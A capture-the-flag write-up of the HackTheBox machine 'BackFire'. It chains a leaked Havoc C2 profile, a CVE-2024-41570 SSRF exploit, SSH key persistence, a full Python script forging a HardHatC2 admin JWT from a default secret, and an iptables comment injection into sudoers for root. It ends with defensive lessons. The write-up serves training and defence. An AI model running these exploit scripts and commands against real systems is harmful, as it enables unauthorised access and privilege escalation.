---
title: "BackFire"
type: docs
tags:
  - htb
  - linux
  - medium
  - c2
  - havoc
  - hardhatc2
  - cve-2024-41570
  - jwt
  - gtfobins
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux, **Difficulty:** Medium, **IP:** 10.10.11.49

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Port 8000 leaks a **Havoc C2** profile with the team-server password.
2. Exploit **CVE-2024-41570** (Havoc team-server SSRF via unauthenticated demon registration) → interact with internal services → shell.
3. Backend kills the shell; use `ilya:CobaltStr1keSuckz!` (from the profile) + a self-generated SSH key to log in as **ilya**.
4. `hardhat.txt` reveals a second C2, **HardHatC2** on localhost:5000. Forge an admin **JWT** (hard-coded HS256 secret) → register a user → C2 terminal → shell as **sergej**.
5. `sergej` may `sudo iptables` / `iptables-save`, abuse `--comment` to inject a sudoers line and `iptables-save -f /etc/sudoers.d/…` , `sudo /bin/bash` , root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| Havoc profile | `ilya : CobaltStr1keSuckz!` |
| HardHatC2 JWT secret (default) | `jtee43gt-6543-2iur-9422-83r5w27hgzaq` |
| `user.txt` | `/home/ilya/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

BackFire immediately struck me as a red-team-themed box, and the deeper I got, the more that theme held: every step of this path is offensive tooling turned back against the person running it. I started by poking at port 8000, and what I found there was a leaked Havoc C2 profile, the kind of operational file that should never be reachable from outside the team server. That leak alone would have been bad enough, but it pointed me toward CVE-2024-41570, an unauthenticated SSRF in the Havoc teamserver that's reachable through the demon registration endpoint. I used that to interact with internal services I otherwise had no business touching.

From there, the box handed me a second red-team framework to abuse: HardHatC2, running quietly on localhost with its JWT signing secret left at the factory default. Once I recognized that, forging an Administrator token was a matter of a few lines of Python, and I used it to register myself an operator account complete with a built-in terminal, no exploit development required beyond reading the source.

Root turned out to be my favorite part of this box: a `sudo iptables` misconfiguration exploited in a way I hadn't seen before. `iptables-save` will happily write the current ruleset to any file I point it at, running as root, and a rule's `--comment` field can hold raw newlines. Putting those two facts together, I smuggled a valid sudoers line into a comment and let `iptables-save` drop it straight into `/etc/sudoers.d/`, turning a firewall management tool into an arbitrary file write.

This box connects nicely to a few others I've documented. For more JWT forgery against a weak or known secret, see [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/). For the broader pattern of a config file leaking a service password, [Monitored](/writeups/hackthebox/linux/medium/monitored/) and [Heal](/writeups/hackthebox/linux/medium/heal/) cover similar ground. And for GTFOBins-style `sudo` binary abuse, I'd point to [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), and [Dog](/writeups/hackthebox/linux/easy/dog/).

## Reconnaissance

```console
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
443/tcp  open  ssl/http nginx 1.22.1
|   X-Havoc: true
8000/tcp open  http     nginx 1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

My nmap scan came back with three open ports: SSH, an HTTPS listener flagging `X-Havoc: true` in its headers, and a second HTTP service on port 8000. That `X-Havoc` header was the first hint I was dealing with red-team infrastructure rather than a typical application stack, so I went straight to port 8000 to see what it was serving. It turned out to expose two files sitting in the open, one of which was a Havoc C2 configuration profile containing live credentials.

## Foothold, Havoc CVE-2024-41570 (SSRF)

With CVE-2024-41570 already on my radar as a known unauthenticated SSRF against the Havoc teamserver, I grabbed a public exploit and pointed it at the target, registering a rogue agent and using that registration to pivot a socket connection back through the teamserver itself:

```bash
python3 exploit.py -t https://10.10.11.49/ -i 127.0.0.1 -p 40056
```

```console
[***] Trying to register agent...
[***] Success!
[***] Trying to open socket on the teamserver...
[***] Success!
```

That shell came through, but it didn't last, the backend process kept killing it out from under me almost as soon as it connected. Rather than fight for stability inside an SSRF-spawned session, I decided to use it just long enough to plant persistence: I generated a fresh SSH keypair locally, appended the public half to `ilya`'s `authorized_keys` through the unstable shell, and then connected properly over SSH using both that key and the password I'd already recovered from the leaked Havoc profile.

```bash
ssh-keygen -f ./id_rsa -N ''
# append id_rsa.pub to /home/ilya/.ssh/authorized_keys via the shell
ssh -i id_rsa ilya@backfire.htb        # ilya:CobaltStr1keSuckz!
```

## ilya → sergej (HardHatC2 JWT forgery)

Once I was in as `ilya`, I started looking around the home directory for anything that hinted at what else was running on the box, and a text file gave away the next pivot almost immediately:

```text
$ cat hardhat.txt
Sergej said he installed HardHatC2 for testing and not made any changes to the defaults
```

That note about "not made any changes to the defaults" was practically an invitation, so my first move was to find out what HardHatC2 was actually listening on locally. I set up an SSH local port forward to reach its admin API on `localhost:5000` from my own machine, then went looking for the framework's default JWT signing secret, which turned out to be published in HardHatC2's own repository:

```bash
ssh -L 5000:localhost:5000 -i id_rsa ilya@backfire.htb
```

```python
import jwt, datetime, uuid, requests

rhost = '127.0.0.1:5000'
secret = "jtee43gt-6543-2iur-9422-83r5w27hgzaq"     # hard-coded default
issuer = "hardhatc2.com"
now = datetime.datetime.utcnow()

payload = {
    "sub": "HardHat_Admin",
    "jti": str(uuid.uuid4()),
    "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier": "1",
    "iss": issuer, "aud": issuer,
    "iat": int(now.timestamp()),
    "exp": int((now + datetime.timedelta(days=28)).timestamp()),
    "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": "Administrator",
}
token = jwt.encode(payload, secret, algorithm="HS256")

requests.post(f"https://{rhost}/Login/Register",
              headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
              json={"username": "sth_pentest", "password": "sth_pentest", "role": "TeamLead"},
              verify=False)
```

With a forged Administrator bearer token in hand, I used it to hit the registration endpoint and create myself a fully legitimate-looking operator account, `sth_pentest`, with a TeamLead role. Logging into the HardHatC2 web panel with those credentials gave me access to its built-in Terminal tab, which is effectively a remote command execution feature by design. I used it to fire off a reverse shell and landed as `sergej`.

## sergej → root (sudo iptables comment injection)

As `sergej`, the first thing I always check is what sudo will let me run without a password, and the output here told me exactly where root was going to come from:

```console
$ sudo -l
sergej ALL=NOPASSWD: /usr/sbin/iptables
sergej ALL=NOPASSWD: /usr/sbin/iptables-save
```

Seeing both `iptables` and `iptables-save` on that list immediately reminded me of a technique for turning `iptables-save`'s arbitrary file write into a sudoers injection. My plan was to add a firewall rule whose comment field contained a properly formatted sudoers line surrounded by newlines, then use `iptables-save` to write the resulting ruleset directly into `/etc/sudoers.d/`, letting the parser's tolerance for unparseable lines do the rest:

```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment $'\nsergej ALL=NOPASSWD: /bin/bash\n' \
  && sudo iptables -S \
  && sudo iptables-save -f /etc/sudoers.d/plswork
```

Confirming it had actually worked was as simple as checking `sudo -l` again:

```console
$ sudo -l
User sergej may run the following commands on backfire:
    (root) NOPASSWD: /usr/sbin/iptables
    (root) NOPASSWD: /usr/sbin/iptables-save
    (root) NOPASSWD: /bin/bash
```

With that new rule in place, dropping into a root shell and grabbing the flag was trivial:

```bash
sudo /bin/bash        # root
cat /root/root.txt
```

<div class="callout callout-note">

**Why the iptables trick works**

Walking through why this actually works: `sudo -l` granted `sergej` passwordless access to both `iptables` and `iptables-save`. The critical detail is that `iptables-save -f <file>` will write the current firewall ruleset to any path I choose, running as root, which makes `/etc/sudoers.d/` a natural target. Normally that would be useless, since the output is iptables rule syntax rather than sudoers syntax, and dropping it wholesale would produce a garbage file. What makes the trick work is that both `sudo` and the sudoers parser silently ignore any line they can't parse and still apply whatever valid lines remain. Because a rule's `--comment` field can hold arbitrary bytes, including literal newlines, I could pass `--comment $'\nsergej ALL=NOPASSWD: /bin/bash\n'` and have `iptables-save` emit that sudoers line on its own dedicated line in the output. The parser skips over the surrounding iptables noise as unparseable and happily honors the one line that is valid sudoers syntax.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/ilya/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **A C2 profile is a credential, treat it like one.** Every step of this box traces back to a Havoc profile sitting somewhere it shouldn't have been. If you're running red team infrastructure, profiles, listener configs, and team server passwords belong behind authentication and network segmentation, never on a path a scanner can stumble into.
- **Patch your offensive tooling with the same discipline as anything else.** CVE-2024-41570 is unauthenticated remote code execution against the Havoc teamserver itself. It's tempting to think of C2 frameworks as internal tools that don't need the same patch cadence as production software, but this box is a direct demonstration of why that assumption fails.
- **Never ship a framework with a hardcoded JWT secret.** HardHatC2's default signing key being public knowledge meant anyone who found the service could mint themselves an Administrator token in a few lines of code. Every deployment needs to generate a unique secret at install time, and that step should be enforced, not optional.
- **`sudo iptables` and `iptables-save` together are effectively root.** The `-f` flag on `iptables-save` is an arbitrary file write running with elevated privileges, and I doubt most administrators granting that access realize it. If you must delegate firewall management through sudo, wrap it in a script that fixes the output path and strips anything resembling sudoers syntax out of rule comments.
- **Isolate red team infrastructure from itself, not just from the internet.** Running two separate C2 frameworks on the same host, with one facing the internet and used to compromise the other, is exactly the kind of internal blast-radius problem that segmentation is meant to prevent. If I were hardening this environment, the Havoc teamserver and HardHatC2 would live on isolated hosts with no lateral path between them.

---

## Related Writeups

- **JWT forgery (weak / known secret):** [Rabbit Store](/writeups/tryhackme/linux/medium/rabbit-store/)
- **Service password in a config file:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Heal](/writeups/hackthebox/linux/medium/heal/), [Bolt](/writeups/hackthebox/linux/medium/bolt/)
- **`sudo` binary abuse (GTFOBins style):** [Lookup](/writeups/tryhackme/linux/easy/lookup/), [Bagel](/writeups/hackthebox/linux/medium/bagel/), [Dog](/writeups/hackthebox/linux/easy/dog/)
- **SSRF to internal service:** [Forge](/writeups/hackthebox/linux/medium/forge/), [Stocker](/writeups/hackthebox/linux/easy/stocker/)

## References

- CVE-2024-41570 (Havoc SSRF/RCE) <https://github.com/chebuya/Havoc-C2-SSRF-poc>
- HardHatC2 default secret advisory <https://github.com/DragoQCC/HardHatC2>
- GTFOBins iptables <https://gtfobins.github.io/gtfobins/iptables/>
- jwt.io <https://jwt.io/>
